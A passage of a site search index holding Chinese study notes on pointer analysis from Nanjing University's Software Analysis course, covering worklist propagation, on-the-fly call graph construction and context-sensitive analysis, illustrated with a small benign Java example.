\u7684\u5faa\u73af\uff0c\u5f53 WL \u4e3a\u7a7a\u65f6\u505c\u6b62\uff1a</p> </li> <li> <p>\u9996\u5148\u4ece WL \u4e2d\u62ff\u51fa\u4e00\u4e2a\u5f85\u5904\u7406\u5bf9\uff0c\u6b64\u5904\u8bb0\u4e3a\uff1a\\(Processing &lt;n,pts&gt;\\)</p> </li> <li> <p>\u57fa\u4e8e \u5dee\u5206\u4f20\u64ad \u601d\u60f3\uff0c\u8ba1\u7b97 \\(\\Delta = pts -pt(n)\\)\uff0c\u7531\u4e8e\u6211\u4eec\u5f53\u524d\u6b63\u5728\u5904\u7406\u6307\u9488 \\(n\\)\uff0c\u800c \\(pt(n)\\) \u4e2d\u5c31\u662f \\(n\\) \u5df2\u7ecf\u6307\u5411\u7684\u5bf9\u8c61\uff0c\u901a\u8fc7\u8ba1\u7b97 \\(\\Delta\\)\uff0c\u5c31\u53ef\u4ee5\u907f\u514d\u91cd\u590d\u5904\u7406\u5df2\u7ecf\u6307\u5411\u7684\u5bf9\u8c61\uff0c\u800c\u5173\u6ce8\u4e8e \\(pts\\) \u4e2d\u65b0\u7684\u5bf9\u8c61\u3002\u8be5\u6b65\u9aa4\u7684\u4f5c\u7528\u5c31\u662f\u8282\u7ea6\u65f6\u95f4\uff0c\u5bf9\u6b63\u786e\u6027\u65e0\u5f71\u54cd\u3002</p> <p></p> </li> <li> <p>\u968f\u540e\u6267\u884c\u65b9\u6cd5 \\(Propagate(n, \\Delta)\\) \uff0c\u8be5\u51fd\u6570\u9996\u5148\u5c06 \\(\\Delta\\) \u4e2d\u7684\u5bf9\u8c61\u52a0\u5165 \\(pt(n)\\) \u4e2d\uff0c\u4e5f\u5c31\u662f\u8ba9 \\(n\\) \u6307\u5411 \\(\\Delta\\) \u4e2d\u7684\u5bf9\u8c61\u3002\u968f\u540e\uff0c\u5bf9\u4e8e\u6240\u6709 \\(n\\) \u7684\u540e\u7ee7\u8fb9 \\(n \u2192 s\\)\uff0c\u5c06 \\(&lt;s, \\Delta&gt;\\) \u52a0\u5165 WL \u4e2d\u3002</p> <p>\u5c06 \\(&lt;s, \\Delta&gt;\\) \u52a0\u5165 WL \u4e2d\u5c31\u610f\u5473\u7740\u540e\u7eed\u5faa\u73af\u7684\u65f6\u5019\uff0c\u5c06\u56de\u8ba9 \\(s\\) \u6307\u5411 \\(\\Delta\\) \u4e2d\u7684\u5bf9\u8c61\uff0c\u5e76\u7ee7\u7eed\u5411\u4e0b\u4f20\u64ad\u3002</p> </li> <li> <p>\u7531\u4e8e \\(n\\) \u6709\u4e24\u79cd\u53ef\u80fd\uff1a\u2460 \u53d8\u91cf\uff0c\u4f8b\u5982 \\(x\\)\uff1b\u2461 \u5b9e\u4f8b\u5b57\u6bb5\uff0c\u4f8b\u5982 \\(o_i.f\\)\u3002\u5f53 \\(n\\) \u662f\u53d8\u91cf\u65f6\uff0c\u7531\u4e8e \\(n\\) \u6307\u5411\u4e86\u65b0\u7684\u5bf9\u8c61\u5b9e\u4f8b\uff0c\u90a3\u4e48\u5bf9\u4e8e Store \u548c Load \u8bed\u53e5\uff0c\u4e5f\u9700\u8981\u66f4\u65b0\uff1a</p> <ul> <li>Store \u8bed\u53e5 \\(x.f = y\\)\uff0c\u5bf9\u4e8e \\(\\Delta\\) \u4e2d\u7684\u6240\u6709\u5bf9\u8c61 \\(o_i \u2208 \\Delta\\)\uff0c\u9700\u8981\u8ba9 \\(o_i.f\\) \u4e5f\u6307\u5411 \\(y\\) \u6307\u5411\u7684\u5bf9\u8c61\uff0c\u56e0\u6b64\u6dfb\u52a0\u8fb9 \\(y \u2192 o_i.f\\) \uff0c\u6b64\u5916\uff0c\u8fd8\u8981\u66f4\u65b0\u6307\u5411\u4fe1\u606f\u3002\uff08AddEdge \u65b9\u6cd5\uff09</li> <li>Load \u8bed\u53e5 \\(y = x.f\\)\uff0c\u540c\u7406\uff0c\u53ea\u662f\u6307\u5411\u7684\u65b9\u5411\u4e0d\u540c\u3002</li> </ul> </li> </ul> <p>\u6839\u636e\u4e0a\u8ff0\u7b97\u6cd5\uff0c\u5728\u6307\u9488\u5206\u6790\u7684\u8fc7\u7a0b\u4e2d\u52a8\u6001\u66f4\u65b0 PFG\uff0c\u5177\u4f53\u4f8b\u5b50\u5982\u4e0b\uff1a</p> <p></p>"},{"location":"security/%E8%BD%AF%E4%BB%B6%E5%AE%89%E5%85%A8%E5%88%86%E6%9E%90/%E5%8D%97%E5%A4%A7%E3%80%8A%E8%BD%AF%E4%BB%B6%E5%88%86%E6%9E%90%E3%80%8B/#_9","title":"\u6307\u9488\u5206\u6790\uff1a\u65b9\u6cd5\u8c03\u7528","text":"<p>\u5728\u6307\u9488\u5206\u6790\u4e2d\u5f15\u5165\u51fd\u6570\u8c03\u7528\u5b9e\u9645\u4e0a\u5c31\u662f\u5728\u8fdb\u884c \u8fc7\u7a0b\u95f4\u6307\u9488\u5206\u6790\uff0c\u56e0\u6b64\u5b83\u4f9d\u8d56\u8c03\u7528\u56fe\uff08call graph\uff09\u3002\u6211\u4eec\u4e4b\u524d\u4ecb\u7ecd\u4e86\u57fa\u4e8e CHA \u7684\u8c03\u7528\u56fe\u6784\u5efa\u65b9\u6cd5\uff0c\u7136\u800c\u8fd9\u6837\u6784\u5efa\u51fa\u6765\u7684\u8c03\u7528\u56fe\u7cbe\u786e\u5ea6\u6bd4\u8f83\u4f4e\u3002</p> <p>\u6211\u4eec\u5c06\u4ecb\u7ecd\u57fa\u4e8e\u6307\u9488\u5206\u6790\u540c\u65f6\u6784\u5efa\u8c03\u7528\u56fe\u548c\u6307\u5411\u5173\u7cfb\u7684\u7b97\u6cd5\u3002\u7531\u4e8e\u6307\u9488\u5206\u6790\u4e2d\u5bf9\u8c61\u7684\u521b\u5efa\u662f\u52a8\u6001\u7684\uff0c\u8fd9\u79cd\u8c03\u7528\u56fe\u6784\u5efa\u65b9\u6cd5\u53c8\u79f0\u4f5c\u201con-the-fly call graph construction\u201d\u3002</p> <p>\u4e00\u3001\u89c4\u5219</p> <p></p> <p>\u6839\u636e\u6761\u4ef6 \\(o_i \u2208 pt(x)\\)\uff0c\u53ef\u77e5\u53d8\u91cf \\(x\\) \u6307\u5411\u5bf9\u8c61 \\(o_i\\)\uff0c\u901a\u8fc7 Dispatch \u65b9\u6cd5\u57fa\u4e8e\u5bf9\u8c61 \\(o_i\\) \u7684\u7c7b\u578b\u5b9a\u4f4d\u5230\u8be5\u5bf9\u8c61\u6240\u5c5e\u7c7b\u7684\u65b9\u6cd5 \\(m\\)\u3002</p> <p>\u5bf9\u4e8e\u4e00\u4e2a\u65b9\u6cd5\uff0c\u9700\u8981\u4f20\u9012\u7684\u6307\u9488\u5171\u6709\u4e09\u7c7b\uff1a</p> <ul> <li>\u5bf9\u8c61\u81ea\u8eab\uff0c\u4e5f\u5c31\u662f this\uff1a \u5728 PFG \u4e2d\uff0c\u6211\u4eec\u5e76\u4e0d\u4f1a\u5728\u53d8\u91cf \\(x\\) \u4e0e \\(m_{this}\\) \u4e4b\u95f4\u6dfb\u52a0\u8fb9\uff0c\u800c\u662f \u76f4\u63a5\u5c06\u53d8\u91cf \\(x\\) \u6240\u6307\u7684\u5bf9\u8c61\u4f20\u64ad\u7ed9 \\(m_{this}\\) \uff08\u5373\u8ba9\u6307\u9488 \\(m_{this}\\) \u4e5f\u6307\u5411\u5bf9\u8c61\u6307\u9488 \\(x\\) \u6307\u5411\u7684\u5bf9\u8c61\u3002\\(o_i \u2208 pt(x),o_i \u2208 pt(m_{this})\\)\uff09\uff0c\u5426\u5219\u53ef\u80fd\u4f1a\u589e\u52a0\u8bb8\u591a\u4e0d\u5fc5\u8981\u7684\u865a\u5047\u8fb9\uff08\u8003\u8651\u4e00\u4e0b \\(x\\) \u53ef\u80fd\u6307\u5411\u591a\u4e2a\u5bf9\u8c61\uff0c\u800c\u5bf9\u8c61\u6240\u5c5e\u7c7b\u53c8\u5177\u6709\u591a\u5c42\u7ee7\u627f\u5173\u7cfb\u7684\u60c5\u51b5\uff09\u3002</li> </ul> <p></p> <ul> <li> <p>\u65b9\u6cd5\u53c2\u6570\uff1a\u5728 PFG \u4e2d\u4e3a\u5f62\u53c2\u548c\u5b9e\u53c2\u90fd\u65b0\u5efa\u4e00\u4e2a\u8282\u70b9\uff0c\u5e76 \u8ba9\u5b9e\u53c2\u6307\u5411\u5f62\u53c2\uff08\u4f8b\u5982\uff1aa1 \u2192 p1\uff09</p> </li> <li> <p>\u65b9\u6cd5\u8fd4\u56de\u503c\uff1a\u5728 PFG \u4e2d\u5c06\u8fd4\u56de\u503c\u548c\u8c03\u7528\u8bed\u53e5\u7684\u5de6\u503c\u65b0\u5efa\u8282\u70b9\uff0c\u5e76 \u8ba9\u8fd4\u56de\u503c\u6307\u5411\u8c03\u7528\u8bed\u53e5\u5de6\u503c\uff08\u4f8b\u5982 ret \u2192 r\uff09</p> </li> </ul> <p></p> <p>\u4e8c\u3001\u8fc7\u7a0b\u95f4\u6307\u9488\u5206\u6790</p> <p>\u5728\u4e0a\u9762\u5b9a\u4e49\u7684\u89c4\u5219\u7684\u57fa\u7840\u4e0a\uff0c\u6211\u4eec\u6765\u8003\u8651\u8fc7\u7a0b\u95f4\u6307\u9488\u5206\u6790\u7684\u7b97\u6cd5\u3002\u9996\u5148\u9700\u8981\u6ce8\u610f\u7684\u662f\uff0c\u6307\u9488\u5206\u6790\u4e0e\u8c03\u7528\u56fe\u6784\u5efa\u662f\u76f8\u8f85\u76f8\u6210\u3001\u4e92\u76f8\u4f9d\u8d56\u7684\u3002\u6211\u4eec\u5728\u4e0a\u4e00\u8282\u4e2d\u63d0\u5230\u8fc7\uff0c\u201c\u6784\u5efa PFG\u201d\u4e0e\u201c\u5728 PFG \u8282\u70b9\u95f4\u4f20\u64ad\u6307\u5411\u5173\u7cfb\u4fe1\u606f\u201d\u662f\u4e92\u76f8\u4f9d\u8d56\u7684\uff0c\u8fd9\u91cc\u4e5f\u662f\u4e00\u6837\u3002</p> <p>\u8fc7\u7a0b\u95f4\u6307\u9488\u5206\u6790\u4ece main \u65b9\u6cd5\u5f00\u59cb\uff0c\u76f4\u5230\u5206\u6790\u5b8c\u6240\u6709\u53ef\u5230\u8fbe\u7684\u65b9\u6cd5\u3002</p> <p></p> <p>\u4e09\u3001\u8fc7\u7a0b\u95f4\u6307\u9488\u5206\u6790\u7b97\u6cd5</p> <p>\u5728\u8be5\u7b97\u6cd5\u4e2d\uff0c\u5c06\u8fdb\u884c\u8fc7\u7a0b\u95f4\u6307\u9488\u5206\u6790\uff0c\u5e76\u540c\u65f6\u751f\u6210 Call Graph\uff0c\u5176\u7b97\u6cd5\u5982\u56fe\u6240\u793a\uff1a</p> <p></p> <p>\u7b97\u6cd5\u4e2d\u7684\u9ec4\u8272\u90e8\u5206\u662f\u76f8\u6bd4\u4e8e\u8fc7\u7a0b\u95f4\u6307\u9488\u5206\u6790\u65b0\u589e\u7684\u90e8\u5206\u3002</p> <ul> <li>\u521d\u59cb\u5316\uff1a\u7b97\u6cd5\u8f93\u5165\u7531\u8bed\u53e5\u96c6\u5408\u6539\u4e3a\u5165\u53e3\u65b9\u6cd5\uff08e.g. main\uff09\uff0c\u65b0\u589e\u4e09\u4e2a\u7a7a\u96c6\u5408\uff0c\u5206\u522b\u662f\u5f85\u5206\u6790\u7684\u8bed\u53e5\u96c6\u5408 S\u3001\u5df2\u5206\u6790\u7684\u65b9\u6cd5 RM\uff08\u7528\u4e8e\u907f\u514d\u91cd\u590d\u5206\u6790\uff09\u4ee5\u53ca\u8c03\u7528\u56fe CG\u3002</li> <li>\u9996\u5148\u5c06\u8c03\u7528 AddReachable \u65b9\u6cd5\uff0c\u8bf4\u660e\u8be5\u65b9\u6cd5\u662f\u53ef\u8fbe\u7684\uff0c\u82e5\u8be5\u65b9\u6cd5\u672a\u88ab\u5206\u6790\u8fc7\uff0c\u5219\u5c06\u5176\u8bed\u53e5\u52a0\u5165\u8bed\u53e5\u96c6\u5408 S \u4e2d\uff0c\u5728\u6dfb\u52a0\u8bed\u53e5\u7684\u8fc7\u7a0b\u4e2d\uff0c\u5982\u679c\u53d1\u73b0\u6709 New \u8bed\u53e5\u6216 Assign \u8bed\u53e5\uff0c\u5219\u505a\u76f8\u5e94\u5904\u7406\u3002</li> <li>\u6700\u540e\u5728\u4f20\u64ad\u8fc7\u7a0b\u4e2d\u82e5 n \u4e3a\u53d8\u91cf\uff0c\u5219\u4f1a\u8c03\u7528 ProcessCall \u65b9\u6cd5\uff0c\u8be5\u65b9\u6cd5\u7528\u4e8e\u5904\u7406\u51fd\u6570\u8c03\u7528\u3002</li> <li>\u9996\u5148\u901a\u8fc7 Dispatch \u65b9\u6cd5\u627e\u5230\u5b9e\u9645\u8c03\u7528\u7684\u65b9\u6cd5\uff0c\u4f7f\u7528\u53d8\u91cf m \u8868\u793a\uff0c\u5e76\u5c06 x \u4f20\u64ad\u5230 m\uff0c\u5373\u8ba9 m \u6307\u5411 o\uff0c\u5373\u7b97\u6cd5\u4e2d\u7684 \\(add &lt;m_{this},\\{o_i\\}&gt; to \\ WL\\)</li> <li>\u66f4\u65b0 CG\uff0c\u8bbe\u5f53\u524d\u8c03\u7528\u7684\u8bed\u53e5\u4f4d\u7f6e\u4e3a \\(l\\)\uff0c\u5728 CG \u4e2d\u65b0\u589e\u8fb9 \\(l \u2192 m\\)\uff0c\u540c\u65f6\u6269\u5927\u53ef\u8fbe\u7684\u65b9\u6cd5\u8303\u56f4\uff08\u5373\u6b64\u65f6\u5c06\u65b9\u6cd5 m \u8ba4\u4e3a\u662f\u53ef\u8fbe\u7684\uff0c\u6240\u8c13\u53ef\u8fbe\u5c31\u662f\u7a0b\u5e8f\u6267\u884c\u7684\u8fc7\u7a0b\u4e2d\u4f1a\u8c03\u7528\u8be5\u65b9\u6cd5\uff0c\u5373\u5b83\u4e0d\u662f\u6b7b\u65b9\u6cd5\uff09\u3002</li> <li>\u5982\u540c\u6211\u4eec\u4e0a\u9762\u6240\u8bf4\u7684\uff0c\u5c06\u53c2\u6570\u548c\u8fd4\u56de\u503c\u6309\u89c4\u5219\u5728 PFG \u4e0a\u6dfb\u52a0\u8fb9\u3002</li> </ul> <p>\u5982\u6b64\uff0c\u5373\u53ef\u5b8c\u6210\u6307\u9488\u5206\u6790\uff0c\u8fc7\u7a0b\u95f4\u6307\u9488\u5206\u6790\u7b97\u6cd5\u6700\u7ec8\u7684\u8f93\u51fa\u6709\u4e24\u4e2a\uff1a\u6307\u5411\u5173\u7cfb\u96c6\u5408\u4e0e\u8c03\u7528\u56fe\u3002</p> <p></p>"},{"location":"security/%E8%BD%AF%E4%BB%B6%E5%AE%89%E5%85%A8%E5%88%86%E6%9E%90/%E5%8D%97%E5%A4%A7%E3%80%8A%E8%BD%AF%E4%BB%B6%E5%88%86%E6%9E%90%E3%80%8B/#_10","title":"\u4e0a\u4e0b\u6587\u654f\u611f\u6307\u9488\u5206\u6790","text":"<p>\u867d\u7136\u6307\u9488\u5206\u6790\u672c\u8eab\u5df2\u7ecf\u6bd4 CHA \u7cbe\u786e\u5f88\u591a\uff0c\u4f46\u662f\u524d\u9762\u6211\u4eec\u5b66\u4e60\u7684\u6307\u9488\u5206\u6790\u662f\u4e0a\u4e0b\u6587\u4e0d\u654f\u611f\u7684\uff0c\u76f8\u5bf9\u4e8e\u4e0a\u4e0b\u6587\u654f\u611f\u7684\u6307\u9488\u5206\u6790\u6765\u8bf4\uff0c\u4f1a\u6709\u4e00\u4e9b false positives\u3002</p> <p>\u8c2d\u6dfb\u8001\u5e08\u63d0\u5230\uff0c\u4e0a\u4e0b\u6587\u654f\u611f\u5206\u6790\u662f\u76ee\u524d Java \u6307\u9488\u5206\u6790\u4e2d\u6700\u6709\u6548\u7684\u5206\u6790\u65b9\u5f0f\u3002</p> <pre><code>void main() {\n    Number n1, n2, x, y;\n    n1 = new One();\n    n2 = new Two();\n    x = id(n1);\n    y = id(n2);\n    int i = x.get();\n}\nNumber id(Number n) {\n    return n;\n}\ninterface Number { int get(); }\nclass One implements Number { public int get() { return 1; }}\nclass Two implements Number { public int get() { return 2; }}\n</code></pre> <p>\u5bf9\u4e8e\u4e0a\u8ff0\u4f8b\u5b50\u6765\u8bf4\uff0c\u4e0a\u4e0b\u6587\u4e0d\u654f\u611f\u7684\u6307\u9488\u5206\u6790\u5c06\u6784\u5efa\u51fa\u56fe\uff081\uff09PFG\uff0c\u5982\u679c\u5728\u6b64\u57fa\u7840\u4e0a\u8fdb\u884c\u5e38\u91cf\u4f20\u64ad\uff0c\u53d8\u91cf \\(i\\) \u7684\u7ed3\u679c\u5c06\u662f NAC\uff0c\u56e0\u4e3a\u5b83\u53ef\u80fd\u662f 1 \u6216 2\u3002\u7136\u800c\uff0c\u4e8b\u5b9e\u4e0a\u8be5\u7a0b\u5e8f\u771f\u6b63\u6267\u884c\u65f6\uff0c\u53d8\u91cf \\(i\\) \u53ea\u53ef\u80fd\u662f 1\uff0c\u4e5f\u5c31\u662f\u53d8\u91cf \\(x\\) \u53ea\u53ef\u80fd\u6307\u5411\u5bf9\u8c61 \\(o_1\\)\u3002</p> <p>\u8be5 PFG \u5982\u4f55\u6784\u5efa\uff1f</p> <ul> <li>\u9996\u5148\u5206\u6790 New \u8bed\u53e5\u65f6\uff0c\u6784\u5efa\u8282\u70b9 \\(n_1\\) \u548c \\(n_2\\)\uff0c\u5206\u522b\u6307\u5411\u5bf9\u8c61 \\(o_1\\) \u548c \\(o_2\\)</li> <li>\u5f53\u8c03\u7528 id(n1) \u65b9\u6cd5\u65f6\uff0c\u5728 PFG \u4e2d\u4e3a\u5b9e\u53c2\u548c\u5f62\u53c2\u6dfb\u52a0\u8fb9\uff0c\u5373 \\(n1 \u2192 n\\)\uff0c\u5e76\u4f20\u64ad\u5bf9\u8c61\uff0c\u5373 \\(pt(n) = \\{o_1\\}\\)\u3002\u63a5\u7740\uff0c\u5728 PFG \u4e2d\u4e3a\u8c03\u7528\u63a5\u53d7\u53d8\u91cf\u548c\u8fd4\u56de\u503c\u4e4b\u95f4\u6dfb\u52a0\u8fb9\uff0c\u5373 \\(n \u2192 x\\)\uff0c\u5e76\u4f20\u64ad\u5bf9\u8c61\uff0c\\(pt(x) = \\{o_1\\}\\)</li> <li>\u540c\u7406\uff0c\u5f53\u8c03\u7528 id(n2) \u65b9\u6cd5\u65f6\uff0c\u6dfb\u52a0\u8fb9 \\(n2 \u2192 n\\)\uff0c\u4f20\u64ad\u5bf9\u8c61\uff0c\u6b64\u65f6 \\(pt(n) = \\{o_1, o_2\\}\\)\u3002\u6dfb\u52a0\u8fb9\u5373 \\(n \u2192 y\\)\uff0c\u5e76\u4f20\u64ad\u5bf9\u8c61\uff0c\uff0c\u6b64\u65f6 \\(pt(y) = \\{o_1, o_2\\}\\)</li> <li>\u6b64\u65f6\uff0c\u8bef\u62a5\u51fa\u73b0\u3002</li> </ul> <p>\u4e0a\u4e0b\u6587\u654f\u611f\u7684\u6307\u9488\u5206\u6790\u65f6\uff0c\u8bef\u62a5\u6d88\u5931\uff0c\uff0c\u53d8\u91cf \\(i\\) \u7ed3\u679c\u5c06\u662f 1\uff0c\u56e0\u4e3a\u53d8\u91cf \\(x\\) \u53ea\u6307\u5411\u5bf9\u8c61 \\(o_1\\)\u3002</p> <p></p> <p>\u603b\u7684\u6765\u770b\uff0c\u4e0a\u4e0b\u6587\u4e0d\u654f\u611f\uff08context insensitivity\uff0c\u7b80\u79f0 C.I.\uff09\u5206\u6790\u7684\u4e0d\u7cbe\u786e\u6027\u4e3b\u8981\u4f53\u73b0\u5728\uff1a</p> <ul> <li>\u5728\u52a8\u6001\u6267\u884c\u8fc7\u7a0b\u4e2d\uff0c\u4e00\u4e2a\u65b9\u6cd5\u53ef\u80fd\u5728\u4e0d\u540c\u7684\u8c03\u7528\u4e0a\u4e0b\u6587\uff08calling contexts\uff09\u4e2d\u88ab\u8c03\u7528\u591a\u6b21\u3002</li> <li>\u5728\u4e0d\u540c\u7684\u8c03\u7528\u4e0a\u4e0b\u6587\u4e2d\uff0c\u65b9\u6cd5\u4e2d\u7684\u53d8\u91cf\u53ef\u80fd\u6307\u5411\u4e0d\u540c\u7684\u5bf9\u8c61\u3002</li> <li>\u5728 C.I.\u6307\u9488\u5206\u6790\u4e2d\uff0c\u4e0d\u540c\u4e0a\u4e0b\u6587\u4e2d\u7684\u5bf9\u8c61\u901a\u8fc7\u8fd4\u56de\u503c\u6216\u65b9\u6cd5\u526f\u4f5c\u7528\u88ab\u6df7\u5728\u4e00\u8d77\u4f20\u64ad\u5230\u7a0b\u5e8f\u5404\u5904\uff0c\u5bfc\u81f4\u4e86\u865a\u5047\u6570\u636e\u6d41\u3002</li> </ul> <p>\u4e0a\u4e0b\u6587\u654f\u611f\uff08context sensitivity\uff0c\u7b80\u79f0 C.S.\uff09\u5206\u6790\u901a\u8fc7\u533a\u5206\u4e0d\u540c\u4e0a\u4e0b\u6587\u4e2d\u7684\u4e0d\u540c\u6570\u636e\u6d41\u6765\u5bf9\u8c03\u7528\u4e0a\u4e0b\u6587\u8fdb\u884c\u5efa\u6a21\uff0c\u4ece\u800c\u63d0\u5347\u51c6\u786e\u6027\u3002</p> <p>\u4e00\u3001Call-Site Sensitivity</p> <p>\u6700\u7ecf\u5178\u7684\u4e0a\u4e0b\u6587\u654f\u611f\u5904\u7406\u7b56\u7565\u662f call-site sensitivity\uff0c\u5b83\u5c06\u6bcf\u4e2a\u65b9\u6cd5\u7684\u4e0a\u4e0b\u6587\u8868\u793a\u4e3a\u7531 call sites \u7ec4\u6210\u7684\u94fe\uff08\u53ef\u80fd\u5305\u62ec\u65b9\u6cd5\u7684 call site\uff0ccaller \u7684 call site\uff0c\u751a\u81f3 caller \u7684 caller \u7684 call site \u7b49\uff09\uff0c\u5bf9\u7a0b\u5e8f\u52a8\u6001\u8fd0\u884c\u65f6\u7684\u8c03\u7528\u6808\u8fdb\u884c\u62bd\u8c61\u3002</p> <p>\u4f8b\u5982\uff0c\u5bf9\u4e8e\u4e0b\u9762\u8fd9\u4e00\u5c0f\u6bb5\u4ee3\u7801\uff0c\u5728 call-site sensitivity \u7b56\u7565\u4e0b\uff0c<code>id(Number)</code>\u65b9\u6cd5\u6709\u4e24\u4e2a\u4e0d\u540c\u7684\u4e0a\u4e0b\u6587[1]\u548c[2]\uff1a</p> <pre><code>1 x = id(n1);\n2 y = id(n2);\n3 int i = x.get();\n4\n5 Number id(Number n) {\n6     return n;\n7 }\n</code></pre> <p>\u5728\u540e\u7eed\u4f1a\u66f4\u8be6\u7ec6\u7684\u4ecb\u7ecd\u4e0a\u4e0b\u6587\u654f\u611f\u5904\u7406\u7b56\u7565\u3002</p> <p>\u4e8c\u3001Cloning-Based Context Sensitivity</p> <p>\u53e6\u5916\uff0c\u4e00\u79cd\u6700\u76f4\u89c2\u7684\u4e0a\u4e0b\u6587\u654f\u611f\u5b9e\u73b0\u65b9\u5f0f\u662f\u201ccloning-based context sensitivity\u201d\uff0c\u6bcf\u4e2a\u65b9\u6cd5\u548c\u53d8\u91cf\u90fd\u4f1a\u5e26\u6709\u4e00\u4e2a\u6216\u591a\u4e2a\u4e0a\u4e0b\u6587\u3002\u9488\u5bf9\u4ee3\u7801\u4e2d\u7684\u4e00\u4e2a\u65b9\u6cd5\u6216\u53d8\u91cf\uff0c\u6211\u4eec\u4eff\u4f5b\u662f\u4e3a\u6bcf\u4e2a\u4e0a\u4e0b\u6587\u514b\u9686\u4e86\u4e00\u4e2a\u8be5\u65b9\u6cd5\u6216\u53d8\u91cf\uff0c\u4ece\u800c\u5c06\u5b83\u4eec\u533a\u5206\u5f00\u6765\u3002\u4e0a\u8ff0\u4ee3\u7801\u76f8\u5e94\u7684 PFG \u5982\u4e0b\u56fe\u6240\u793a\uff1a</p> <p></p> <p>\u4e09\u3001Context-Sensitive Heap</p> <p>\u9762\u5411\u5bf9\u8c61\u7684\u7a0b\u5e8f\u662f heap-intensive \u7684\u3002\u56e0\u6b64\uff0c\u4e3a\u4e86\u63d0\u9ad8\u51c6\u786e\u6027\uff0c\u6211\u4eec\u4e5f\u8981\u5bf9\u5806\u62bd\u8c61\uff08heap abstraction\uff09\u505a\u4e0a\u4e0b\u6587\u654f\u611f\u5904\u7406\u2014\u2014\u62bd\u8c61\u5bf9\u8c61\u5c06\u5e26\u6709 heap context\u3002\u5728\u57fa\u4e8e allocation-site \u7684\u5806\u62bd\u8c61\u57fa\u7840\u4e0a\uff0c\u4e0a\u4e0b\u6587\u654f\u611f\u7684\u5806\u62bd\u8c61\u5c06\u63d0\u4f9b\u7c92\u5ea6\u66f4\u7ec6\u7684\u5806\u6a21\u578b\uff1a</p> <p></p> <p>\u4e3a\u4ec0\u4e48 C.S.\u7684\u5806\u62bd\u8c61\u80fd\u591f\u63d0\u9ad8\u51c6\u786e\u6027\u5462\uff1f\u8fd9\u662f\u56e0\u4e3a\uff08\u53ef\u4ee5\u4e0e\u524d\u6587\u63cf\u8ff0\u7684 C.I.\u7684\u4e0d\u7cbe\u786e\u6027\u7ed3\u5408\u8d77\u6765\u7406\u89e3\uff09\uff1a</p> <ul> <li>\u5728\u52a8\u6001\u6267\u884c\u8fc7\u7a0b\u4e2d\uff0c\u4e00\u4e2a allocation site \u53ef\u80fd\u5728\u4e0d\u540c\u7684\u8c03\u7528\u4e0a\u4e0b\u6587\u4e2d\u521b\u5efa\u591a\u4e2a\u5bf9\u8c61\u3002</li> <li>\u5728\u540c\u4e00\u4e2a site \u521b\u5efa\u7684\u4e0d\u540c\u5bf9\u8c61\u53ef\u80fd\u662f\u7531\u4e0d\u540c\u7684\u6570\u636e\u6d41\u63a7\u5236\u7684\u2014\u2014\u4f8b\u5982\uff0c\u5c06\u4e0d\u540c\u7684\u503c\uff08\u503c\u53ef\u80fd\u6765\u81ea\u4e0d\u540c\u7684\u65b9\u6cd5\u8c03\u7528\uff09\u5b58\u50a8\u5230\u5bf9\u8c61\u7684\u57df\u4e2d\u3002</li> </ul> <p>\u56e0\u6b64\uff0c\u5728\u6307\u9488\u5206\u6790\u4e2d\uff0c\u5728\u6ca1\u6709 heap context \u65f6\uff0c\u5408\u5e76\u4e0d\u540c\u4e0a\u4e0b\u6587\u7684\u6570\u636e\u6d41\u5230\u4e00\u4e2a\u62bd\u8c61\u5bf9\u8c61\u53ef\u80fd\u5bfc\u81f4\u51c6\u786e\u5ea6\u964d\u4f4e\uff1b\u5c06\u4f4d\u4e8e\u540c\u4e00 allocation size \u4f46\u4e0d\u540c\u4e0a\u4e0b\u6587\u7684\u5bf9\u8c61\u533a\u5206\u5f00\u6765\u624d\u80fd\u63d0\u9ad8\u51c6\u786e\u5ea6\u3002</p> <p>\u4e0b\u9762\u662f\u4e00\u4e2a\u5bf9\u6bd4\u7684\u6848\u4f8b\u3002</p> <p>\u5de6\u4fa7\u8868\u683c\u5c55\u793a\u7684\u662f\u5bf9\u65b9\u6cd5\u53d8\u91cf\u5e94\u7528\u4e0a\u4e0b\u6587\u654f\u611f\u5904\u7406\uff0c\u4f46\u4e0d\u5bf9\u5806\u8fdb\u884c\u4e0a\u4e0b\u6587\u654f\u611f\u5904\u7406\u7684\u6307\u9488\u5206\u6790\u7ed3\u679c\uff1b</p> <p>\u53f3\u4fa7\u5c55\u793a\u7684\u662f\u5bf9\u65b9\u6cd5\u53d8\u91cf\u548c\u5806\u90fd\u8fdb\u884c\u4e0a\u4e0b\u6587\u654f\u611f\u5904\u7406\u7684\u6307\u9488\u5206\u6790\u7ed3\u679c\uff0c\u53ef\u4ee5\u770b\u51fa\uff0c\u540e\u8005\u6bd4\u524d\u8005\u66f4\u7cbe\u51c6\uff1a</p> <p></p> <p>\u53e6\u5916\uff0c\u540c\u65f6\u5bf9\u65b9\u6cd5\u53d8\u91cf\u548c\u5806\u8fdb\u884c\u4e0a\u4e0b\u6587\u654f\u611f\u5904\u7406\u624d\u80fd\u6700\u5927\u7a0b\u5ea6\u5730\u63d0\u9ad8\u7cbe\u786e\u5ea6\uff0c\u53ea\u5904\u7406\u540e\u8005\u4e0d\u5904\u7406\u524d\u8005\u540c\u6837\u4f1a\u5bfc\u81f4\u7cbe\u786e\u5ea6\u964d\u4f4e\uff1a</p> <p></p> <p>\u56db\u3001\u89c4\u5219</p> <p></p> <p>\u524d\u56db\u7c7b\u8bed\u53e5\u89c4\u5219\u4e0e\u975e\u4e0a\u4e0b\u6587\u654f\u611f\u7684\u89c4\u5219\u4e00\u81f4\uff0c\u552f\u4e00\u7684\u4e0d\u540c\u5c31\u662f\u4e0a\u4e0b\u6587\u524d\u7f00\u3002</p> <p>\u4f8b\u5982\uff1a\u5bf9\u4e8e Assign \u8bed\u53e5 <code>x=y</code>\uff0c\u5176\u89c4\u5219\u4e3a\uff0c\u4e0a\u4e0b\u6587 c \u4e2d\u7684\u6307\u9488 y \u6307\u5411\u7684\u5bf9\u8c61\uff0c\u4e5f\u9700\u8981\u8ba9\u4e0a\u4e0b\u6587 c \u4e2d\u7684\u6307\u9488 x \u6307\u5411\uff08\u4f46\u4e0d\u540c\u7684\u4e0a\u4e0b\u6587\u4e4b\u95f4\u4e92\u4e0d\u5f71\u54cd\u3002</p> <p>\u65b9\u6cd5\u8c03\u7528\u8bed\u53e5\u65b0\u589e\u4e86 Select \u51fd\u6570\uff0c\u7528\u4e8e\u4e3a\u76ee\u6807\u65b9\u6cd5 m \u6839\u636e call site \\(l\\) \u5904\u7684\u4fe1\u606f\u9009\u53d6\u5bf9\u5e94\u7684\u4e0a\u4e0b\u6587\uff0c\u5176\u4e2d\\(c\\) \u662f caller \u7684\u4e0a\u4e0b\u6587\uff0c \\(c^t\\) 